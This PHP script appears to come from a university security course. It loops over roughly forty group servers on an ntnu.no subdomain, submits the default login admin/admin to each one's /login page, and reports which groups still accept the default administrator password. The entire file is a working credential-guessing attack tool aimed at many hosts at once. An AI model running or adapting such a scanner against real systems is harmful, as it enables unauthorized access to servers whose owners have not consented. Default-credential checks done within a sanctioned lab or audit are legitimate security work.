<?php

for ($i = 10; $i <= 50; $i++) {
    $s = $i;
    if ($i < 10) {
        $s = "0".$i;
    }

    $url = "https://grp".$s.".ttm4135.item.ntnu.no:90".$s."/login";

    $data = array('username' => 'admin', 'password' => 'admin');

    // use key 'http' even if you send the request to https://...
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        )
    );


    try {
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);

        if ($result === FALSE) {
            //echo "=============================== Error for grp".$s;
        }

        if (strpos( $result, "Incorrect" ) !== false) {
            echo "\nPeople in grp".$s." are hella smart";
        }
        else {
            echo "\nGrp".$s." has default admin";
        }
    }
    catch (Exception $e) {
        echo "\nError at grp".$s;
    }
    finally {
        echo "\n";
    }

    // echo "========== Result for grp" . $s;
    // var_dump($result);
}

?>
